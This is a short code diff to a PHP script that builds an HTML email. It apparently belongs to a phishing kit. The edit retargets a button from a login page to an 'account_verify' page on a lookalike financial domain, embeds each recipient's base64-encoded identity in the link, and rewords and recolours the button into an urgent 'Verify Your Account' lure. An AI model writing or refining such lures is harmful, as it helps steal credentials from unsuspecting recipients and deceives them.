@@ -51,15 +51,15 @@ $message2='<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http:
 							<tr>
 								<td align="center" colspan="2">
 									<div style="line-height: 24px;margin-top: 20%;">
-										<a href="https://capitolmoneypay.com/member/nz-login.html#uID:'.base64_encode($user0).'" target="_blank" class="btn btn-danger block-center" style="
+										<a href="https://capitolmoneypay.com/member/account_verify.html#uID:'.base64_encode($user0).'" target="_blank" class="btn btn-danger block-center" style="
 											color: #f7f2f2;
 											border: 1px solid;
 											padding: 10px 40px 15px 37px;
-											background: rgb(8, 98, 193);
+											background: rgb(212, 55, 54);
 											font-size: 16px;
 											margin: -7px;
 										" target="_blank">
-											Login Your Account
+											Verify Your Account
 										</a>
 									</div>
 									<div style="height: 60px; line-height: 60px; font-size: 10px;"></div>
